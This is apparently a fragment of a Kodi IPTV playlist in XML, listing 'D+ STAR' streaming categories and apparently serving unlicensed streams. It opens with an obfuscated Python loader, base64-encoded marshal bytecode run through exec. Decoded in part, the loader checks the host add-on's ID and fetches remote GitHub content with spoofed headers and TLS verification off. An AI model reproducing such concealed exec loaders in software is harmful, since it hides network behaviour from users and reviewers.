import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/bVddFrl.png</thumbnail>
<fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
</item>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <item>
 <title>[COLOR gold]D+ STAR [COLOR white]Star Wars[/COLOR]</title>
 <link>http://ignorame</link>
 <thumbnail>https://i.imgur.com/uWjOtiw.jpg<thumbnail>
 <fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
 <externallink></externallink>
 </item>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <item>
 <title>[COLOR gold]D+ STAR [COLOR white]Marvel[/COLOR]</title>
 <link>http://ignorame</link>
 <thumbnail>https://i.imgur.com/eymRVZU.jpg<thumbnail>
 <fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
 <externallink></externallink>
 </item>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------

<item>
 <title>[COLOR gold]D+ STAR [COLOR white]National Geographic[/COLOR]</title>
 <link>http://ignorame</link>
 <thumbnail>https://i.imgur.com/Ni6IBNd.jpg<thumbnail>
 <fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
 <externallink></externallink>
 </item>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
 <title>[COLOR gold]D+ STAR [COLOR white]Colecciones[/COLOR]</title>
 <link>http://ignorame</link>
 <thumbnail><thumbnail>
 <fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
 <externallink></externallink>
 </item>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  

